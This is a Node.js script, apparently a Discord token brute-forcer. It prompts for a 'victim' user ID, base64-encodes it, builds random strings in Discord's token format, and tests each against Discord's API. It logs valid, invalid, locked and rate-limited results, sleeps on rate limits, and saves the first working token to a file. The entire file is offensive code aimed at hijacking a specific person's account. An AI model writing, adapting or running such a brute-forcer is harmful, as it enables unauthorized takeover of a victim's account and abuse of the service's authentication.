// Npm packages
const fetch = require("node-fetch");
const prompt = require("prompt-sync")();
const fs = require('fs');

const getEncVictim = () => {
    const userId = prompt("User Id of victim: ");
    return Buffer.from(userId).toString("base64");
}

// To sleep in ms
const sleep = (ms) => { 
    return new Promise((resolve) => { 
        setTimeout(resolve, ms); 
    }); 
}

// Gets a string with random letters, the amount of letter depends on the length given
const randChars = (length) => {
    let finalResult = '';
    const letters = [
        'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h',
        'i', 'j', 'k', 'l', 'n', 'm', 'o', 'p',
        'q', 'r', 's', 't', 'u', 'v', 'w', 'x',
        'y', 'z', 'A', 'B', 'C', 'D', 'E', 'F',
        'G', 'H', 'I', 'J', 'K', 'L', 'N', 'M',
        'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V',
        'W', 'X', 'Y', 'Z'
    ];

    for (i = 0; i < length; i++) {
        finalResult = finalResult + letters[Math.floor(Math.random() * letters.length)];
    } 
    
    return finalResult;
}

const getToken = (userId) => { return `${userId}.${randChars(6)}.${randChars(25)}` }

const checkToken = async (token) => {
    try {
        const response = await fetch(
            "https://discord.com/api/v9/users/@me/library",
            {
                headers: {
                    "user-agent":
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36",
                    authorization: token,
                },
                method: "GET",
        });
  
        return response.status;

    } catch (err) {
        return 1;
    }
};

const main = async () => {
    const encodedId = getEncVictim();

    outerLoop:
    while (true) {
        let token = getToken(encodedId);
        let statusCode = await checkToken(token);
        switch (statusCode) {
            case 200:
                console.log(`[VALID] ${token}`);
                fs.writeFile('Valid_token.txt', token, (err) => {
                    if (err != null) {
                        console.log(`Error while writing to file: ${err}`);
                    }
                });
                break outerLoop;

            case 401:
                console.log(`[INVALID] ${token}`);
                break;

            case 403:
                console.log(`[LOCKED] ${token}`);
                break;

            case 429:
                console.log(`[RATELIMITED] ${token}`);
                await sleep(120000);
                break;

            case 1:
                console.log("An unknown error occured");
                break;

            default:
                console.log("An unknown error occured");
        }
    }
}

main();
